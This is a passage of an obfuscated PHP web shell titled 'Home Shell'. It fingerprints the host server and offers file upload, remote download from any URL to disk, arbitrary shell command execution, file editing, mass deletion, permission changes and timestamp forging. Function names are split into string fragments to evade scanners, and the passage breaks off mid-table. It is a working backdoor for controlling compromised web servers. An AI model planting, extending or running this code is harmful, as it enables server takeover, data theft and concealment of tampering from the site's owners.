        color: var(--blue-600);
    }

    .font-medium {
        font-weight: 400;
    }

    .font-bold {
        font-weight: 600;
    }

    .form-tools {
        background: var(--gray-700);
        border: 1px solid var(--gray-500);
        border-radius: 5px;
        transition: .3s;
    }

    .form-tools:hover {
        background: var(--gray-900);
    }

    .btn-new-file {
        background: var(--gray-900);
        border-radius: 5px;
        transition: .3s;
    }

    .btn-new-file:hover {
        background: var(--gray-700);
        color: var(--white);
    }

    .btn-cmd {
        background: var(--gray-900);
        border-radius: 5px;
        transition: .3s;
    }

    .btn-cmd:hover {
        background: var(--gray-700);
        color: var(--white);
    }

    .btn-new-folder {
        background: var(--amber-600);
        border-radius: 5px;
        transition: .3s;
    }

    .btn-new-folder:hover {
        background: var(--amber-800);
        color: var(--white);
    }

    .uk-alert-danger,.uk-alert-success,.uk-alert-warning {
        background: transparent;
        color: var(--red-500);
        font-weight: 600;
    }

    .uk-alert-success {
        color: var(--green-500);
    }

    .uk-alert-warning {
        color: var(--yellow-500);
    }

    .path {
        color: var(--sky-400);
        font-weight: 600;
    }
    .path:hover {
        color: var(--sky-600);
        text-decoration: none;
    }
    .home_sh_e_ll {
        color: var(--green-400);
        font-weight: 600;
    }
    .home_sh_e_ll:hover {
        color: var(--green-600);
        text-decoration: none;
    }
    .nulz-table, th,td {
        border: 5px solid var(--gray-700);
        border-collapse: collapse;
        padding: 5px 10px 5px 10px;
    }
    .nulz-table td {
        text-align: center;
    }
    .nulz-table .body-folder {
        text-align: left;
        font-weight: 600;
    }
    .nulz-table .body-file {
        text-align: left;
    }
    .body-permission {
        color: var(--white);
    }
    .body-permission:hover {
        color: var(--gray-900);
        text-decoration: none;
    }
    .body-size {
        color: var(--rose-300);
        cursor: pointer;
    }
    .body-size:hover {
        color: var(--red-500);
    }
    .body-datetime {
        color: var(--teal-400);
    }
    .body-datetime:hover {
        text-decoration: none;
        color: var(--sky-500);
    }
    .nulz-table th {
        background: var(--gray-900);
    }
    .nulz-table .tr-body:hover {
        background: var(--gray-600);
    }

    .dirpath:hover {
        color: var(--gray-900);
        text-decoration: none;
    }
    .filepath:hover {
        color: var(--gray-900);
        text-decoration: none;
    }
    .green-perms:hover {
        color: var(--green-600);
    }
    .red-perms:hover {
        color: var(--red-800);
    }
    .icon {
        font-size: large;
    }
    .rename-folder-icon {
        color: var(--yellow-500);
    }
    .rename-folder-icon:hover {
        color: var(--yellow-600);
    }
    .rename-file-icon {
        color: var(--teal-200);
    }
    .rename-file-icon:hover {
        color: var(--teal-400);
    }
    .user-icon {
        color: var(--gray-500);
    }
    .user-icon:hover {
        color: var(--gray-200);
    }
    .download-icon {
        color: var(--gray-500);
    }
    .download-icon:hover {
        color: var(--gray-200);
    }
    .delete-icon {
        color: var(--rose-500);
    }
    .delete-icon:hover {
        color: var(--rose-800);
    }

    .mass-option {
        background: transparent;
        padding: 5px 10px 5px 10px;
        border-radius: 10px;
    }
    .mass-option option {
        background: transparent;
        filter: invert(100%);
    }
    .btn-mass {
        background: transparent;
        padding: 5px 10px 5px 10px;
        outline: none;
        border: 1px solid var(--gray-500);
        border-radius: 5px;
        transition: .2s;
    }
    .btn-mass:hover {
        background: var(--gray-900);
        transform: scale(1.046);
    }
    </style>
</head>

<body>
    <header class="uk-width-1-1" style="background: var(--gray-900);">
        <div class="uk-margin-small-left">
            <div class="z4phy-sans uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
                <img style="width: 5vh; border-radius: 5px;" src="<?=$s_he_ll_Logo?>" alt="<?=$s_he_ll_Name?>">
                <span class="uk-margin-small-left font-trade-winds uk-text-large"><?=$s_he_ll_Name?></span>
            </div>
            <div class="z4p-ph4ntom uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
            <span class="font-bold"><?='Sy'.'s'.'te'.'m'?>: <?=Z4pUname();?></span>
            <span class="font-bold"><?='ID'.'('.'Us'.'er'.'/'.'G'.'ro'.'u'.'p)'?>: <font class="font-green font-ubuntu-mono">uid=<?=$uid?>(<?=$user?>)&nbsp;gid=<?=$gid?>(<?=$group?>)</font></span>
            <span class="font-bold"><?='Se'.'r'.'v'.'er '.'I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=serverIp()?></font></span>
            <span class="font-bold"><?='Yo'.'u'.'r I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=userIp()?></font></span>
            <span class="font-bold"><?='S'.'a'.'f'.'e '.'Mo'.'d'.'e'?>: <?=$safeMode?></span>
            <span class="font-bold"><?='P'.'HP'.' '.'Ve'.'r'.'s'.'i'.'on'?>: <font class="font-green font-ubuntu-mono"><?=$phpVersion?></font></span>
            <span class="font-bold"><?='S'.'er'.'v'.'e'.'r'?>: <font class="font-green font-ubuntu-mono"><?=$serverName?></font></span>
            <span class="font-bold uk-text-wrap uk-flex uk-flex-row uk-flex-wrap"><?='Di'.'sa'.'b'.'l'.'e '.'F'.'un'.'ct'.'i'.'on'?>:&nbsp;<?=$cekFunc?></span>
            <span class="font-bold"><?=cekCurl()?>&nbsp;|&nbsp;<?=cekWget()?>&nbsp;|&nbsp;<?=cekPython2()?>&nbsp;|&nbsp;<?=cekPython3()?>&nbsp;|&nbsp;<?=cekPerl()?>&nbsp;|&nbsp;<?=cekRuby()?>&nbsp;|&nbsp;<?=cekgcc()?>&nbsp;|&nbsp;<?=cekPkexec()?>&nbsp;|&nbsp;<?=cekSudo()?></span>
            <?php
                $pa_t_hs = explode("/", $path);
                echo '<span class="font-bold pwd"><i class="fa-duotone fa-folder-tree"></i>&nbsp;&nbsp;PWD: ';
                echo '<a class="font-red" href="?path=/"><i class="fa-sharp fa-solid fa-slash-forward"></i></a>';
                foreach ($pa_t_hs as $id => $pat) {
                    echo "<a class='path' href='?path=";
                    for ($i = 0; $i <= $id; $i++) {
                        echo $pa_t_hs[$i];
                        if ($i != $id) {
                            echo '/';
                        }
                    }
                    echo "'>$pat</a><span class='font-red'>/</span>";
                }
                echo "&nbsp;&nbsp;<span class='font-red'>[ <a href='".$_SERVER['PHP_SELF']."' class='home_sh_e_ll'><font class='home_sh_e_ll'>Ho"."me"." "."Sh"."el"."l</font></a> ]</span>";
                echo '</span>';
            ?>
        </div>
    </div>
    </header>

    <div class="tools-z4p uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
        <div class="tools-upload">
            <form action="" method="POST" enctype="multipart/form-data" class="form-tools uk-form-horizontal uk-margin uk-padding-small font-protest-riot">
                <input type="file" name="file[]" onchange="this.form.submit()" multiple>
            </form>
            <?php
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                if (isset($_FILES["file"])) {
                    $countFiles = count($_FILES["file"]["name"]);
                    for ($i = 0; $i < $countFiles; $i++) {
                        $fi_le_Na_me = $_FILES["file"]["name"][$i];
                        $location = "" . $fi_le_Na_me;
                        $u_pl_oa_dF_un_ct_ion = "m"."ove" . "_up" . "loa"."ded_fi" . "le";
            
                        if ($u_pl_oa_dF_un_ct_ion($_FILES["file"]["tmp_name"][$i], $location)) {
                            echo '
                            <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => <a href="'.$fi_le_Na_me.'">'.$fi_le_Na_me.'</a></font> Su'.'cc'.'es'.'s Up'.'lo'.'a'.'de'.'d <i class="fa-sharp fa-solid fa-shield-check"></i></p>
                            </div>
                            ';
                        } else {
                            echo '
                            <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => '.$fi_le_Na_me.'</font> Fa'.'il'.'ed '.'To'.' U'.'pl'.'oa'.'d <i class="fa-solid fa-octagon-xmark"></i></p>
                            </div>
                            ';
                        }
                    }
                } else {
                    echo '
                    <div class="uk-alert-warning uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                        <a href class="uk-alert-close" uk-close></a>
                        <p>No Fi'.'l'.'es U'.'pl'.'oa'.'de'.'d.<i class="fa-regular fa-location-exclamation"></i></p>
                    </div>
                    ';
                }
            }
            ?>
        </div>
        <?php
            if (isset($_POST['btn-remoteup'])) {
                $hayoloh = 'h'.'tm'.'ls'.'pe'.'cial'.'ch'.'ars';
                $b_name = 'b'.'as'.'en'.'am'.'e';
                $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';
                $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
                $fo = "fop"."en";
                $fw = "fw"."r"."it"."e";
                $fc = 'fc'.'lo'.'s'.'e';
                $this_file = $_POST['fileurl'];
                $this_file_name = $_POST['savedname'];
                $f_content = $f_get($this_file);
                if (!empty($this_file) && !empty($this_file_name)) {
                    if ($f_content !== false) {
                        $writeF = $f_put($this_file_name, $f_content);
                        if ($writeF !== false) {
                            echo '
                            <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => <a href="'.$this_file_name.'">'.$this_file_name.'</a></font> S'.'uc'.'ce'.'s'.'s U'.'pl'.'oa'.'de'.'d <i class="fa-sharp fa-solid fa-shield-check"></i></p>
                            </div>
                            ';
                        } else {
                            echo '
                            <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => '.$this_file_name.'</font> Fa'.'i'.'le'.'d '.'To'.' Up'.'lo'.'ad<i class="fa-solid fa-octagon-xmark"></i></p>
                            </div>
                            ';
                        }
                    } else {
                        echo '
                        <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                            <a href class="uk-alert-close" uk-close></a>
                            <p><font class="font-white">Fi'.'le => '.$this_file_name.'</font> Fa'.'il'.'ed T'.'o U'.'pl'.'oa'.'d<i class="fa-solid fa-octagon-xmark"></i></p>
                        </div>
                        ';
                    }
                } else {
                    echo '
                    <div class="uk-alert-warning uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                        <a href class="uk-alert-close" uk-close></a>
                        <p>No F'.'il'.'es U'.'pl'.'oa'.'de'.'d, Your Input Is Empty<i class="fa-regular fa-location-exclamation"></i></p>
                    </div>
                    ';
                }
            }
        ?>
        <div class="tools-remoteup uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap">
            <form action="" method="POST" class="uk-width-1-2">
                <fieldset class="uk-fieldset">
                    <legend class="uk-legend font-bold font-protest-riot"><?='Re'.'mo'.'te'.' U'.'pl'.'oa'.'d'?></legend>
                    <div class="uk-margin-small">
                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="https://z4phy-c0de.go.id/files.txt" aria-label="Input">
                        <div class="uk-margin-small"></div>
                        <input class="uk-input font-poppins" name="savedname" type="text" placeholder="saved.txt" aria-label="Input">
                    </div>
                    <div class="uk-float-right">
                        <button type="submit" name="btn-remoteup" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Get</button>
                    </div>
                </fieldset>
            </form>
        </div>
        <div class="tools-etc uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
            <a href="?path=<?=$path?>&tools=newfiles"><button class="btn-new-file uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i class="fa-solid fa-file-plus"></i>&nbsp;New Files</button></a>
            <a href="?path=<?=$path?>&tools=cmd"><button class="btn-cmd uk-button uk-button-default uk-margin-small-left uk-margin-small-right uk-margin-large-bottom font-white font-ubuntu-mono"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;Command</button></a>
            <a href="?path=<?=$path?>&tools=newfolder"><button class="btn-new-folder uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i class="fa-sharp fa-solid fa-folder-plus"></i>&nbsp;New Folder</button></a>
        </div>
        <div class="mass uk-flex uk-flex-center uk-flex-middle uk-flex-column">
            <?php
            if (isset($_POST['btn-mass'])) {
                if (isset($_POST['mass-option']) == 'mass_delete') {
                    if (!empty($_POST['checkfolder'])) {
                        foreach ($_POST['checkfolder'] as $folder) {
                            if (is_dir($folder)) {
                                if (deleteDir($folder)) {
                                    echo '
                                    <div class="uk-alert-success" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$folder.' Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                                    </div>
                                    ';
                                } else {
                                    echo '
                                    <div class="uk-alert-danger" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$folder.' Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                                    </div>
                                    ';
                                }
                            }
                        }
                    }
                    if (!empty($_POST['checkfile'])) {
                        foreach ($_POST['checkfile'] as $file) {
                            if (file_exists($file)) {
                                if(deleteFile($file)) {
                                    echo '
                                    <div class="uk-alert-success" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$file.' Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                                    </div>
                                    ';
                                } else {
                                    echo '
                                    <div class="uk-alert-danger" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$file.' Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                                    </div>
                                    ';
                                }
                            }
                        }
                    }
                } else {
                    //null
                }
            }
            ?>
        </div>
        <?php
            if (isset($_GET['deletedir'])) {
                $dirName = $_GET['deletedir'];
                    if (deleteDir($dirName)) {
                    echo '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Success, Folder Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                        </div>
                        ';
                    } else {
                    echo '
                        <div class="uk-alert-danger" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Failed, Folder Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                        </div>
                        ';
                    }
            }
            if (isset($_GET['deletefile'])) {
                $fileName = $_GET['deletefile'];
                if (deleteFile($fileName)) {
                echo '
                    <div class="uk-alert-success" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Success, File Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                    </div>
                    ';
                } else {
                echo '
                <div class="uk-alert-danger" uk-alert>
                    <a href class="uk-alert-close" uk-close></a>
                    <p>Failed, File Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                </div>
                ';
                }
            }
            $toolsparam = isset($_GET['tools']) ? $_GET['tools'] : null;
            if ($toolsparam === null) {
                //null
            } elseif ($toolsparam === 'newfiles') {
                if (isset($_POST['btn-newfiles'])) {
                    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
                    $f_put = 'f'.'il'.'e'.'_'.'p'.'u'.'t'.'_'.'co'.'nt'.'e'.'n'.'ts';
                    $f_o = 'fo'.'p'.'e'.'n';
                    $f_w = 'fw'.'ri'.'t'.'e';
                    $f_c = 'fc'.'lo'.'s'.'e';
                    $fi_le_name = htmlspecialchars($_POST['newfilesname']);
                    $fi_le_content = $_POST['newfilecontent'];
                    $f_il_e_success = '
                    <div class="uk-alert-success" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>'.$fi_le_name.'&nbsp;Fi'.'le Created&nbsp;<i class="fa-solid fa-file-check font-green"></i></p>
                    </div>
                    ';
                    $f_il_e_failed = '
                    <div class="uk-alert-danger" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Create Fi'.'le Failed&nbsp;<i class="fa-solid fa-file-xmark font-red"></i></p>
                    </div>
                    ';
                    if ($fi_le_name == '' && $fi_le_content == '') {
                        echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Sorry. Cant Not Create Fi'.'l'.'es. Your Input Is Empty&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                        </div>
                        ';
                    } else {
                        if ($func_exist($f_o)) {
                            $c_r_e_a_t_e_f_i_l_e_1 = $f_o($fi_le_name, 'w');
                            if ($c_r_e_a_t_e_f_i_l_e_1 === false) {
                                $c_r_e_a_t_e_f_i_l_e_2 = $f_put($fi_le_name, $fi_le_content);
                                if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
                                    echo $f_il_e_failed;
                                } else {
                                    echo $f_il_e_success;
                                }
                            } else {
                                if ($f_w($c_r_e_a_t_e_f_i_l_e_1, $fi_le_content) === false) {
                                    echo $f_il_e_failed;
                                } else {
                                    echo $f_il_e_success;
                                }
                                $f_c($c_r_e_a_t_e_f_i_l_e_1);
                            }
                        } elseif ($func_exist($f_put)) {
                            $c_r_e_a_t_e_f_i_l_e_2 = $f_put($fi_le_name, $fi_le_content);
                                if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
                                    echo $f_il_e_failed;
                                } else {
                                    echo $f_il_e_success;
                                }
                        } else {
                            echo '
                            <div class="uk-alert-warning" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p>Sorry. Cant Not Create Fi'.'le'.'s&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                            </div>
                            ';
                        }
                    }
                    
                }
                echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-new'.'fi'.'le'.'s" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Cr'.'ea'.'te F'.'il'.'e</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">N'.'e'.'w '.'F'.'il'.'es</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newfi'.'l'.'es'.'na'.'me" type="text" placeholder="fi'.'le'.'na'.'me.'.'t'.'x'.'t" aria-label="Input">
                        </div>
                        <div class="uk-margin">
                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Z4phy Phantomhive" aria-label="Textarea"></textarea>
                        </div>
                    </fieldset>
                </form>
                ';
            } elseif ($toolsparam === 'newfolder') {
                if (isset($_POST['btn-newfolder'])) {
                    $f_ol_de_r_name = htmlspecialchars($_POST['newfoldername']);
                    $cr_ea_teF_old_er = "mk"."d"."ir";
                    $is_d = 'i'.'s'.'_'.'d'.'ir';
                    $f_ol_de_r_success = '
                    <div class="uk-alert-success" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p><font class="font-yellow">'.$f_ol_de_r_name.'</font>&nbsp;Fo'.'ld'.'er Cr'.'ea'.'te'.'d&nbsp;<i class="fa-solid fa-folder-check font-green"></i></p>
                    </div>
                    ';
                    $f_ol_de_r_failed = '
                    <div class="uk-alert-danger" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Cr'.'ea'.'t'.'e F'.'ol'.'de'.'r Failed&nbsp;<i class="fa-solid fa-folder-xmark font-red"></i></p>
                    </div>
                    ';
                    if ($f_ol_de_r_name == '') {
                        echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Sorry. Cant Not Cr'.'e'.'at'.'e Fo'.'ld'.'er. This Input Is Empty&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                        </div>
                        ';
                    } else {
                        if (!$is_d($f_ol_de_r_name)) {
                            if($cr_ea_teF_old_er($f_ol_de_r_name)) {
                                echo $f_ol_de_r_success;
                            } else {
                                echo $f_ol_de_r_failed;
                            }
                        } else {
                            echo '
                            <div class="uk-alert-warning" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p>Sorry. Cant Not C'.'re'.'at'.'e F'.'ol'.'de'.'r. This '.$fo_lde_rna_me.' Allready Exists&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                            </div>
                            ';
                        }
                    }
                }
                echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-newfolder" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Create Folder</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">New Folder</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newfoldername" type="text" placeholder="New Folder" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';
            } elseif ($toolsparam === 'cmd') {
                echo '
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <legend class="uk-legend font-bold font-protest-riot"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;&nbsp;Command</legend>
                        <div class="uk-margin-small uk-flex uk-flex-row uk-flex-center uk-flex-middle uk-flex-nowrap">
                            <label for="komendnya" class="uk-margin-small-right uk-text-large">$</label>
                            <input style="background: var(--gray-950);" class="uk-input font-poppins uk-margin-small-right" id="komendnya" name="komendnya" type="text" placeholder="uname -a" aria-label="Input" autofocus>
                            <button type="submit" name="btn-cmd" style="background: var(--gray-950); border: 1px solid var(--gray-700);" class="uk-button uk-button-secondary uk-text-bold uk-border-rounded">ENTER</button>
                        </div>
                        <div>';
                        if (isset($_POST['btn-cmd'])) {
                            echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>'.Z4pCmd($_POST["komendnya"]).'</textarea>';
                        }
                echo '</div>
                    </fieldset>
                </form>
                ';
            } else {
                //null
            }

            if (isset($_GET['editfile'])) {
                $hayoloh = 'h'.'tm'.'ls'.'pe'.'cial'.'ch'.'ars';
                $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nt'.'en'.'t'.'s';
                $f_put = 'f'.'il'.'e'.'_'.'p'.'u'.'t'.'_'.'co'.'nt'.'e'.'n'.'ts';
                $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
                $fo = "fop"."en";
                $fw = "fw"."r"."it"."e";
                $fc = 'fc'.'lo'.'s'.'e';
                $this_file = $_GET['editfile'];
                if (isset($_POST['btn-editfiles'])) {
                    $newfilecontent = $_POST['newfilecontent'];
                    $f_il_e_success = '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Success, File Saved&nbsp;<i class="fa-solid fa-file-check font-green"></i></p>
                        </div>
                        ';
                    $f_il_e_failed = '
                    <div class="uk-alert-danger" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Failed, File Not Saved&nbsp;<i class="fa-solid fa-file-xmark font-red"></i></p>
                    </div>
                    ';
                    if ($func_exist($fo)) {
                        $editfi_le1 = $fo($this_file, 'w');
                        if ($fw($editfi_le1, $newfilecontent)) {
                            echo $f_il_e_success;
                        } else {
                            echo $f_il_e_failed;
                        }
                    } elseif($func_exist($f_put)) {
                        $editfi_le2 = $f_put($this_file, $newfilecontent);
                                if ($editfi_le2 === false) {
                                    echo $f_il_e_failed;
                                } else {
                                    echo $f_il_e_success;
                                }
                    } else {
                        echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Sorry. Cant Edit This File '.$this_file.'&nbsp;<i class="fa-solid fa-file-exclamation"></i></p>
                        </div>
                        ';
                    }
                }
                echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-editfiles" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Save</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">Edit Files</legend>
                        <div class="uk-margin">
                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Z4phy Phantomhive" aria-label="Textarea">'.$hayoloh($f_get($this_file)).'</textarea>
                        </div>
                    </fieldset>
                </form>
                ';
            }

            if (isset($_GET['rename'])) {
                $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
                $this_name = $_GET['rename'];
                $rnm = 'r'.'e'.'n'.'a'.'m'.'e';
                if (isset($_POST['btn-rename'])) {
                    $newname = $hayoloh($_POST['newname']);
                    if ($rnm($this_name, $path.'/'.$newname)) {
                        echo '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>
                                <font class="font-green">Rename Success&nbsp;<i class="fa-sharp fa-regular fa-shield-check font-green"></i>
                                <font class="font-white">'.$this_name.' To '.$newname.'</font>
                            </p>
                        </div>
                        ';
                    } else {
                        echo '
                        <div class="uk-alert-danger" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Rename Failed&nbsp;<i class="fa-regular fa-octagon-xmark font-red"></i></p>
                        </div>
                        ';
                    }
                    $this_name = $newname;
                }
                echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-rename" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Rename</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">Rename</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newname" type="text" value="'.$this_name.'" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';
            }
            if (isset($_GET['permission'])) {
                $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
                $value = $path . '/' . $_GET['permission'];
                if (isset($_POST['btn-permission'])) {
                    $newperms = $hayoloh($_POST['newperms']);
                    $chperms = 'c'.'h'.'m'.'o'.'d';
                    $oct = 'o'.'c'.'t'.'d'.'e'.'c';
                    if ($chperms($value, $oct($newperms))) {
                        echo '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p><font class="font-green">Change Permission Success&nbsp;<i class="fa-sharp fa-regular fa-shield-check font-green"></i></p>
                        </div>
                        ';
                    } else {
                        echo '
                        <div class="uk-alert-danger" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Change Permission Failed&nbsp;<i class="fa-regular fa-octagon-xmark font-red"></i></p>
                        </div>
                        ';
                    }
                }
                echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-permission" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Change Permission</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">Cange Permission</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newperms" type="text" value="'.chPerms($value).'" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';
            }
            if (isset($_GET['changedate'])) {
                $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
                $f_time = 'f'.'il'.'e'.'m'.'t'.'im'.'e';
                $str_time = 's'.'tr'.'to'.'ti'.'me';
                $tch = 'to'.'uc'.'h';
                $value = $_GET['changedate'];
                $this_date = date("Y-m-d H:i:s", $f_time($value));
                if (isset($_POST['btn-newdate'])) {
                    $newDate = $hayoloh($_POST['newdate']);
                    if ($str_time($newDate) !== false) {
                        if ($tch($value, $str_time($newDate))) {
                            echo '
                            <div class="uk-alert-success" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-green">Change Date Success&nbsp;<i class="fa-solid fa-calendar-check"></i></p>
                            </div>
                            ';
                        } else {
                            echo '
                            <div class="uk-alert-danger" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p>Change Date Failed&nbsp;<i class="fa-solid fa-calendar-xmark"></i></p>
                            </div>
                            ';
                        }
                    } else {
                        echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Change Date Failed, Invalid Date Format&nbsp;<i class="fa-solid fa-calendar-exclamation"></i></p>
                        </div>
                        ';
                    }
                }
                echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-newdate" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Change Date</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">Cange Date</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newdate" type="text" value="'.$this_date.'" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';
            }
        ?>
    </div>
    <div class="main uk-width-1-1 uk-margin-top uk-margin-small-left uk-margin-small-right" style="background: var(--gray-900);">
        <?php
            $scn_d = 'sc'.'an'.'d'.'ir';
            $scan = $scn_d($path);
        ?>
        <div class="uk-overflow-auto uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
            <form action="" method="POST" enctype="multipart/form-data" class="uk-width-1-1">
                <table class="nulz-table uk-width-1-1">
                    <thead>
                        <tr>
                            <th>Select All<br><input type="checkbox" id="checkall" class="checkall" name="checkall" aria-label="Checkbox"></th>
                            <th>Name</th>
                            <th>Last Modified</th>
                            <th>Size</th>
                            <th>Owner/Group</th>
